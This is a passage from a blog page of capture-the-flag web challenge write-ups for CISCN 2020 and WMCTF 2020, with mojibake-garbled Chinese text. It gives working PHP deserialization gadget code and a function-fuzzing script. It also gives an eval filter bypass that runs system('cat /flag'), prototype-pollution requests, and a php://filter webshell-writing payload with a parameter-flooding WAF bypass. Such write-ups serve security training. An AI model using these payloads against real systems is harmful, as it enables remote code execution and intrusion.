class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;events=[<span class="string">&quot;disconnect&quot;</span>=&gt;<span class="keyword">array</span>(<span class="keyword">new</span> \DB\SQL\Mapper(<span class="keyword">new</span> \DB\SQL\Mapper(<span class="string">&quot;&quot;</span>)),<span class="string">&quot;find&quot;</span>)];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;server=&amp;<span class="keyword">$this</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">WS</span></span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    <span class="title">echo</span> <span class="title">urlencode</span>(<span class="title">serialize</span>(<span class="title">array</span>(<span class="title">new</span> \<span class="title">CLI</span>\<span class="title">WS</span>(),<span class="title">new</span> \<span class="title">CLI</span>\<span class="title">Agent</span>())));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h2><p>é˜…è¯»ä»£ç æˆ‘ä»¬å‘ç°:<code>if(!pcntl_wifexited($status))&#123;phpinfo();&#125;</code>ï¼ŒåŠforkçš„å­è¿›ç¨‹æŠ¥é”™å°±ä¼šæ‰§è¡Œphpinfoï¼Œè€Œphpinfoé‡Œé¢é€šå¸¸åŒ…å«æ•æ„Ÿä¿¡æ¯ï¼Œå’Œä¸€äº›å¯¹æˆ‘ä»¬é¢˜ç›®æœ‰å¸®åŠ©çš„ä¿¡æ¯ã€‚</p>
<p>forkå­è¿›ç¨‹æ‰§è¡Œçš„ä»£ç æ˜¯ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>])&amp;&amp;is_string(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>])&amp;&amp;!preg_match(<span class="string">&quot;/[:\\\\]|exec|pcntl/i&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]))&#123;</span><br><span class="line">            call_user_func_array(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>],[<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>],<span class="literal">false</span>,<span class="literal">true</span>]);</span><br></pre></td></tr></table></figure>

<p>è€Œè¿™é‡Œè°ƒç”¨äº†éå¸¸æ•æ„Ÿçš„call_user_func_arrayï¼Œæ‰€ä»¥æ— è®ºæ˜¯æƒ³è®©å­è¿›ç¨‹æŠ¥é”™è¿˜æ˜¯ç›´æ¥æ‰§è¡Œä»£ç è¿™é‡Œéƒ½æ˜¯éå¸¸å¥½çš„é€‰æ‹©ã€‚å› æ­¤æˆ‘ä»¬å…ˆè¦å†™ä¸ªfuzzè„šæœ¬ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$payloads</span>=[</span><br><span class="line">        <span class="string">&quot;ls&quot;</span>,<span class="comment">//shellå‘½ä»¤æ‰§è¡Œæµ‹è¯•</span></span><br><span class="line">        <span class="string">&quot;index.php&quot;</span>,<span class="comment">//è¯»å–æ–‡ä»¶æµ‹è¯•</span></span><br><span class="line">        <span class="string">&quot;asdfasldfjaklsdfjl.php&quot;</span>,<span class="comment">//åˆ›å»ºæ–‡ä»¶/æ–‡ä»¶å¤¹æµ‹è¯•</span></span><br><span class="line">        <span class="string">&quot;echo 123;&quot;</span><span class="comment">//phpå‘½ä»¤æ‰§è¡Œæµ‹è¯•</span></span><br><span class="line">    ];</span><br><span class="line">    <span class="variable">$str</span>=file_get_contents(<span class="string">&quot;fatalerr.log&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="variable">$str</span>)&#123;</span><br><span class="line">        <span class="variable">$str</span>=<span class="string">&quot;[]&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$fatalerror</span>=<span class="keyword">eval</span>(<span class="string">&quot;return &quot;</span>.<span class="variable">$str</span>.<span class="string">&quot;;&quot;</span>);</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">show_result</span>(<span class="params"><span class="variable">$func</span>,<span class="variable">$r</span>,<span class="variable">$v</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$r</span>==<span class="literal">NULL</span>)&#123;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$func</span>(<span class="subst">$v</span>,false,true) return value:&quot;</span>;</span><br><span class="line">            var_dump(<span class="variable">$r</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)&#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">brute_func</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$payloads</span>;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$fatalerror</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$val</span>)&#123;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span>(is_array(<span class="variable">$val</span>))&#123;</span><br><span class="line">                brute_func(<span class="variable">$val</span>);</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span>(in_array(<span class="variable">$val</span>,<span class="variable">$fatalerror</span>))&#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            array_push(<span class="variable">$fatalerror</span>,<span class="variable">$val</span>);</span><br><span class="line">            file_put_contents(<span class="string">&quot;fatalerr.log&quot;</span>,var_export(<span class="variable">$fatalerror</span>,<span class="literal">TRUE</span>));</span><br><span class="line">            <span class="keyword">foreach</span>(<span class="variable">$payloads</span> <span class="keyword">as</span> <span class="variable">$v</span>)&#123;</span><br><span class="line">                <span class="variable">$r</span>=<span class="literal">NULL</span>;</span><br><span class="line">                </span><br><span class="line">                <span class="variable">$r</span>=call_user_func_array(<span class="variable">$val</span>,[<span class="variable">$v</span>,<span class="literal">false</span>,<span class="literal">true</span>]);</span><br><span class="line">                show_result(<span class="variable">$val</span>,<span class="variable">$r</span>,<span class="variable">$v</span>);</span><br><span class="line">                </span><br><span class="line">            &#125;</span><br><span class="line">            array_pop(<span class="variable">$fatalerror</span>);</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="variable">$arr</span>=get_defined_functions();</span><br><span class="line">    brute_func(<span class="variable">$arr</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<p>å¤šæ¬¡æ‰§è¡Œå‘ç°ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">stream_socket_server</span><br><span class="line">exec</span><br><span class="line">stream_socket_client</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸‰ä¸ªå‡½æ•°ä¼šå¼•èµ·segment_fault ä¸” execè™½ç„¶ä¼šå¼•èµ·segment  faultä½†æ˜¯ä»ç„¶æ‰§è¡Œäº†ä»£ç </p>
<p>ä½†æ˜¯è¿™é‡Œåªéœ€è¦segment_fault,æ‰€ä»¥è®¿é—®<code>?a=stream_socket_server&amp;b=</code>æ‹¿åˆ°flag</p>
<h2 id="rceme"><a href="#rceme" class="headerlink" title="rceme"></a>rceme</h2><p>æ³¨æ„åˆ°æœ‰ä¸ªevalåªè¦ç»•è¿‡é™åˆ¶å°±å¯ä»¥æ‰§è¡Œå‘½ä»¤äº†</p>
<p>å¾ˆç®€å•åˆ©ç”¨å­—ç¬¦ä¸²æ‹¼æ¥ç»•è¿‡</p>
<p><code>&#123;if:+(&#39;base64_deco&#39;.&#39;d&#39;.&#39;e&#39;)(&#39;c3lzdGVt&#39;)(&#39;cat+/flag&#39;)&#125;&#123;end+if&#125;</code></p>
<h2 id="easytrick"><a href="#easytrick" class="headerlink" title="easytrick"></a>easytrick</h2><p>é˜Ÿé‡Œçš„å¸ˆå‚…åšå‡ºæ¥çš„,dbqï¼Œæˆ‘å¤ªèœäº†</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">trick</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$trick1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$trick2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$t</span> = <span class="keyword">new</span> trick;</span><br><span class="line"><span class="variable">$t</span>-&gt;trick1 = <span class="string">&quot;INF&quot;</span>;</span><br><span class="line"><span class="variable">$t</span>-&gt;trick2 = <span class="number">1e1111</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$t</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="littlegame"><a href="#littlegame" class="headerlink" title="littlegame"></a>littlegame</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Î» npm audit</span><br><span class="line"></span><br><span class="line">                       === npm audit security report ===</span><br><span class="line"></span><br><span class="line"># Run  npm update set-value --depth 1  to resolve 1 vulnerability</span><br><span class="line"></span><br><span class="line">  High            Prototype Pollution</span><br><span class="line"></span><br><span class="line">  Package         set-value</span><br><span class="line"></span><br><span class="line">  Dependency of   set-value</span><br><span class="line"></span><br><span class="line">  Path            set-value</span><br><span class="line"></span><br><span class="line">  More info       https://npmjs.com/advisories/1012</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">found 1 high severity vulnerability in 61 scanned packages</span><br><span class="line">  run `npm audit fix` to fix 1 of them.</span><br></pre></td></tr></table></figure>

<p>åŸå‹é“¾æ±¡æŸ“ï¼Œpocåœ°å€ï¼š<br><a target="_blank" rel="noopener" href="https://snyk.io/vuln/SNYK-JS-SETVALUE-450213">https://snyk.io/vuln/SNYK-JS-SETVALUE-450213</a></p>
<ul>
<li>å…ˆè®¿é—®ä¸€æ¬¡<code>/SpawnPoint</code>ï¼Œæ‹¿ä¸ªsessionid</li>
<li>ç„¶åè®¿é—®<code>/Privilege</code>æ±¡æŸ“åŸå‹é“¾ï¼ˆç”¨<code>constructor.prototype</code>æˆ–è€…<code>__proto__</code>å‡å¯ï¼‰</li>
<li>æœ€åè®¿é—®<code>/DeveloperControlPanel</code>æ‹¿flag</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /Privilege HTTP/1.1</span><br><span class="line">Host: host</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Cookie: session=yoursession</span><br><span class="line"></span><br><span class="line">NewAttributeValue=abc&amp;NewAttributeKey=__proto__.password4</span><br><span class="line"></span><br><span class="line">POST /DeveloperControlPanel HTTP/1.1</span><br><span class="line">Host: host</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Cookie: session=yoursession</span><br><span class="line"></span><br><span class="line">key=password4&amp;password=abc</span><br></pre></td></tr></table></figure>
      
    </div>
    <footer class="article-footer">
      <a data-url="https://site.ccreater.top/2020/08/20/ciscn2020%E9%A2%84%E9%80%89%E8%B5%9B/" data-id="ckw7zp3yx003vftn7a351584o" data-title="ciscn2020é¢„é€‰èµ›" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-wmctf2020" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/08/03/wmctf2020/" class="article-date">
  <time class="dt-published" datetime="2020-08-03T16:00:00.000Z" itemprop="datePublished">2020-08-04</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">æ¯”èµ›</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/08/03/wmctf2020/">wmctf2020</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="wmctf-2020"><a href="#wmctf-2020" class="headerlink" title="wmctf 2020"></a>wmctf 2020</h1><p>u1s1ï¼Œè¿™æ¬¡æ¯”èµ›è´¨é‡å¾ˆé«˜</p>
<h2 id="web-checkin"><a href="#web-checkin" class="headerlink" title="web_checkin"></a>web_checkin</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//PHP 7.0.33 Apache/2.4.25</span><br><span class="line">error_reporting(0);</span><br><span class="line">$sandbox = &#x27;/var/www/html/&#x27; . md5($_SERVER[&#x27;REMOTE_ADDR&#x27;]);</span><br><span class="line">@mkdir($sandbox);</span><br><span class="line">@chdir($sandbox);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">if(isset($_GET[&#x27;content&#x27;])) &#123;</span><br><span class="line">    $content = $_GET[&#x27;content&#x27;];</span><br><span class="line">    if(preg_match(&#x27;/iconv|UCS|UTF|rot|quoted|base64/i&#x27;,$content))</span><br><span class="line">         die(&#x27;hacker&#x27;);</span><br><span class="line">    if(file_exists($content))</span><br><span class="line">        require_once($content);</span><br><span class="line">    file_put_contents($content,&#x27;&lt;?php exit();&#x27;.$content);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é¢˜å°±å¾ˆç®€å•ï¼Œå› ä¸ºflagå°±åœ¨/flagï¼Œç›´æ¥åŒ…å«æ‹¿åˆ°flag</p>
<h2 id="web-checkin2"><a href="#web-checkin2" class="headerlink" title="web_checkin2"></a>web_checkin2</h2><p>è¿™é¢˜å°±å¾ˆæœ‰æ„æ€äº†ï¼Œæäº†æ•´æ•´ä¸€å¤©</p>
<p>ä¸€æ ·çš„ä»£ç </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//PHP 7.0.33 Apache/2.4.25</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$sandbox</span> = <span class="string">&#x27;/var/www/html/&#x27;</span> . md5(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_REAL_IP&#x27;</span>]);</span><br><span class="line">@mkdir(<span class="variable">$sandbox</span>);</span><br><span class="line">@chdir(<span class="variable">$sandbox</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/iconv|UCS|UTF|rot|quoted|base64/i&#x27;</span>,<span class="variable">$content</span>))</span><br><span class="line">         <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(file_exists(<span class="variable">$content</span>))</span><br><span class="line">        <span class="keyword">require_once</span>(<span class="variable">$content</span>);</span><br><span class="line">    file_put_contents(<span class="variable">$content</span>,<span class="string">&#x27;&lt;?php exit();&#x27;</span>.<span class="variable">$content</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™æ¬¡flagä¸åœ¨/flagï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å‘½ä»¤æ‰§è¡Œ</p>
<p>å› ä¸ºè¿™ä¸ªphpç‰ˆæœ¬æ˜¯7.0.33æ‰€ä»¥<code>string.strip_tags</code>è¿™ä¸ªè¿‡æ»¤å™¨ä¸èƒ½ç”¨ï¼Œä¸ç„¶çš„è¯å¯ä»¥åˆ©ç”¨è¿™æ ·çš„payload:<code>php://filter/write=string.strip_tags|dechunk/resource=%3f&gt;%31%0a%3c%0a%32%36%0a%3f%70%68%70%20%65%76%61%6c%28%24%5f%50%4f%53%54%5b%31%5d%29%3b%65%78%69%74%3b</code></p>
<p>ä¸ºå•¥ä¸èƒ½ç”¨å˜ï¼Œå› ä¸º7.0.33ç‰ˆæœ¬æœ‰ä¸ªbugï¼Œç”¨<code>string.strip_tags</code>ä¼šå‡ºç°segment fault</p>
<p>åæ¥æˆ‘å°±æƒ³åˆ°äº†ï¼Œåˆ©ç”¨segment faultï¼Œphpä¸ä¼šåˆ é™¤ä¸´æ—¶æ–‡ä»¶ï¼Œæ‰€ä»¥å°±ä¸Šä¼ æ–‡ä»¶ï¼Œç„¶åçˆ†ç ´æ–‡ä»¶åï¼Œä½†æ˜¯åæ¥é¢˜ç›®å¼„äº†ä¸ªæé†’ï¼š<code>no brute force</code> å¿ƒæ€è£‚å¼€</p>
<p>äºæ˜¯æˆ‘ä»¬å¾—æ‰¾å…¶ä»–çš„æ–¹æ³•ï¼Œ</p>
<p>è¿™ä¸‹å½»åº•æ²¡æ‹›äº†ï¼Œåªèƒ½å»çœ‹æºä»£ç äº†ï¼Œåœ¨åˆ†æä»£ç çš„æ—¶å€™å‘ç°ï¼š</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200802191228.png" alt="image1550"></p>
<p>phpä¼šå¯¹filterè¿›è¡Œurldecodeï¼Œç¾æ»‹æ»‹é‚£ä¹ˆpayloadå‡ºæ¥äº†</p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/write=%2563%256f%256e%2576%2565%2572%2574%252e%2562%2561%2573%2565%2536%2534%252d%2565%256e%2563%256f%2564%2565|%2573%2574%2572%2569%256e%2567%252e%2572%256f%2574%2531%2533|%2563%256f%256e%2576%2565%2572%2574%252e%2562%2561%2573%2565%2536%2534%252d%2564%2565%2563%256f%2564%2565/resource=1%09%0Fc%9DCm0%A3.%A0%FBq%2BS%82%1FQ%28d%8D%1C%07b8%9C%A0%FB%0An</span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯æ–°çš„é—®é¢˜å‡ºç°äº†ï¼Œè¿™ä¸ªç½‘ç«™çš„ä¸­é—´ä»¶ä¼šban<code>%25</code>ï¼Œé€å‡ºé¢˜äººä¸€å¥mmpã€‚</p>
<p>è·¨è¿‡åƒå±±ä¸‡æ°´æ¥åˆ°è¿™é‡Œï¼Œç»“æœè¿˜æœ‰æ–°çš„æ‹¦è·¯è™ã€‚</p>
<p>ä¸€èˆ¬é‡åˆ°æœåŠ¡å™¨ä¸­é—´ä»¶æ‹¦æˆª%25çš„æ—¶å€™ï¼Œæˆ‘ä»¬å¯ä»¥è¯•è¯•phpä¸ä¸­é—´ä»¶å¯¹æ•°æ®è§£æçš„å·®å¼‚æ¥ç»•è¿‡ï¼Œæˆ–è€…è¯•è¯•httpè¯·æ±‚èµ°ç§ï¼Œæµ‹è¯•åå‘ç°ä¸¤ç§éƒ½ä¸è¡Œ</p>
<p>æœåŠ¡å™¨è¿‡æ»¤äº†%25ï¼Œæµ‹è¯•ä¸‹å‘ç°è¿™æ˜¯æ˜¯é’ˆå¯¹å‚æ•°å€¼çš„ï¼Œå¦‚æŠŠ%25æ”¾åˆ°å‚æ•°åé‚£é‡Œå°±æ˜¯å¾ˆokçš„ï¼Œç„¶åæˆ‘ä»¬å°±çŸ¥é“ä»–æ˜¯é’ˆå¯¹å‚æ•°æ£€æµ‹çš„ï¼Œå¦‚æœå‚æ•°è¿‡å¤šå®ƒè¿˜èƒ½æ£€æµ‹å—</p>
<p>äºæ˜¯æœ‰ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET /index.php/aaa/?a=&amp;b=&amp;c=&amp;d=&amp;e=&amp;f=&amp;g=&amp;h=&amp;i=&amp;j=&amp;k=&amp;l=&amp;m=&amp;n=&amp;o=&amp;p=&amp;q=&amp;r=&amp;s=&amp;t=&amp;u=&amp;v=&amp;w=&amp;x=&amp;y=&amp;z=&amp;A=&amp;B=&amp;C=&amp;D=&amp;E=&amp;F=&amp;G=&amp;H=&amp;I=&amp;J=&amp;K=&amp;L=&amp;M=&amp;N=&amp;O=&amp;P=&amp;Q=&amp;R=&amp;S=&amp;T=&amp;U=&amp;V=&amp;W=&amp;X=&amp;Y=&amp;Z=&amp;0=&amp;1=&amp;2=&amp;3=&amp;4=&amp;5=&amp;6=&amp;7=&amp;8=&amp;9=&amp;aa=&amp;ab=&amp;ac=&amp;ad=&amp;ae=&amp;af=&amp;ag=&amp;ah=&amp;ai=&amp;aj=&amp;ak=&amp;al=&amp;am=&amp;an=&amp;ao=&amp;ap=&amp;aq=&amp;ar=&amp;as=&amp;at=&amp;au=&amp;av=&amp;aw=&amp;ax=&amp;ay=&amp;az=&amp;aA=&amp;aB=&amp;aC=&amp;aD=&amp;aE=&amp;aF=&amp;aG=&amp;aH=&amp;aI=&amp;aJ=&amp;aK=&amp;aL=&amp;aM=&amp;aN=&amp;aO=&amp;aP=&amp;aQ=&amp;aR=&amp;aS=&amp;aT=&amp;aU=&amp;aV=&amp;aW=&amp;aX=&amp;aY=&amp;aZ=&amp;a0=&amp;a1=&amp;a2=&amp;a3=&amp;a4=&amp;a5=&amp;a6=&amp;a7=&amp;a8=&amp;a9=&amp;ba=&amp;bb=&amp;bc=&amp;bd=&amp;be=&amp;bf=&amp;bg=&amp;bh=&amp;bi=&amp;bj=&amp;bk=&amp;bl=&amp;bm=&amp;bn=&amp;bo=&amp;bp=&amp;bq=&amp;br=&amp;bs=&amp;bt=&amp;bu=&amp;bv=&amp;bw=&amp;bx=&amp;by=&amp;bz=&amp;bA=&amp;bB=&amp;bC=&amp;bD=&amp;bE=&amp;bF=&amp;bG=&amp;bH=&amp;bI=&amp;bJ=&amp;bK=&amp;bL=&amp;bM=&amp;bN=&amp;bO=&amp;bP=&amp;bQ=&amp;bR=&amp;bS=&amp;bT=&amp;bU=&amp;bV=&amp;bW=&amp;bX=&amp;bY=&amp;bZ=&amp;b0=&amp;b1=&amp;b2=&amp;b3=&amp;b4=&amp;b5=&amp;b6=&amp;b7=&amp;b8=&amp;b9=&amp;ca=&amp;cb=&amp;cc=&amp;cd=&amp;ce=&amp;cf=&amp;cg=&amp;ch=&amp;ci=&amp;cj=&amp;ck=&amp;cl=&amp;cm=&amp;cn=&amp;co=&amp;cp=&amp;cq=&amp;cr=&amp;cs=&amp;ct=&amp;cu=&amp;cv=&amp;cw=&amp;cx=&amp;cy=&amp;cz=&amp;cA=&amp;cB=&amp;cC=&amp;cD=&amp;cE=&amp;cF=&amp;cG=&amp;cH=&amp;cI=&amp;content=php://filter/write=%2563%256f%256e%2576%2565%2572%2574%252e%2562%2561%2573%2565%2536%2534%252d%2565%256e%2563%256f%2564%2565|%2573%2574%2572%2569%256e%2567%252e%2572%256f%2574%2531%2533|%2563%256f%256e%2576%2565%2572%2574%252e%2562%2561%2573%2565%2536%2534%252d%2564%2565%2563%256f%2564%2565/resource=1%09%0Fc%9DCm0%A3.%A0%FBq%2BS%82%1FQ%28d%8D%1C%07b8%9C%A0%FB%0An&amp;cJ=&amp;cK=&amp;cL=&amp;cM=&amp;cN=&amp;cO=&amp;cP=&amp;cQ=&amp;cR=&amp;cS=&amp;cT=&amp;cU=&amp;cV=&amp;cW=&amp;cX=&amp;cY=&amp;cZ=&amp;c0=&amp;c1=&amp;c2=&amp;c3=&amp;c4=&amp;c5=&amp;c6=&amp;c7=&amp;c8=&amp;c9=&amp;da=&amp;db=&amp;dc=&amp;dd=&amp;de=&amp;df=&amp;dg=&amp;dh=&amp;di=&amp;dj=&amp;dk=&amp;dl=&amp;dm=&amp;dn=&amp;do=&amp;dp=&amp;dq=&amp;dr=&amp;ds=&amp;dt=&amp;du=&amp;dv=&amp;dw=&amp;dx=&amp;dy=&amp;dz=&amp;dA=&amp;dB=&amp;dC=&amp;dD=&amp;dE=&amp;dF=&amp;dG=&amp;dH=&amp;dI=&amp;dJ=&amp;dK=&amp;dL=&amp;dM=&amp;dN=&amp;dO=&amp;dP=&amp;dQ=&amp;dR=&amp;dS=&amp;dT=&amp;dU=&amp;dV=&amp;dW=&amp;dX=&amp;dY=&amp;dZ=&amp;d0=&amp;d1=&amp;d2=&amp;d3=&amp;d4=&amp;d5=&amp;d6=&amp;d7=&amp;d8=&amp;d9=&amp;ea=&amp;eb=&amp;ec=&amp;ed=&amp;ee=&amp;ef=&amp;eg=&amp;eh=&amp;ei=&amp;ej=&amp;ek=&amp;el=&amp;em=&amp;en=&amp;eo=&amp;ep=&amp;eq=&amp;er=&amp;es=&amp;et=&amp;eu=&amp;ev=&amp;ew=&amp;ex=&amp;ey=&amp;ez=&amp;eA=&amp;eB=&amp;eC=&amp;eD=&amp;eE=&amp;eF=&amp;eG=&amp;eH=&amp;eI=&amp;eJ=&amp;eK=&amp;eL=&amp;eM=&amp;eN=&amp;eO=&amp;eP=&amp;eQ=&amp;eR=&amp;eS=&amp;eT=&amp;eU=&amp;eV=&amp;eW=&amp;eX=&amp;eY=&amp;eZ=&amp;e0=&amp;e1=&amp;e2=&amp;e3=&amp;e4=&amp;e5=&amp;e6=&amp;e7=&amp;e8=&amp;e9=&amp;fa=&amp;fb=&amp;fc=&amp;fd=&amp;fe=&amp;ff=&amp;fg=&amp;fh=&amp;fi=&amp;fj=&amp;fk=&amp;fl=&amp;fm=&amp;fn=&amp;fo=&amp;fp=&amp;fq=&amp;fr=&amp;fs=&amp;ft=&amp;fu=&amp;fv=&amp;fw=&amp;fx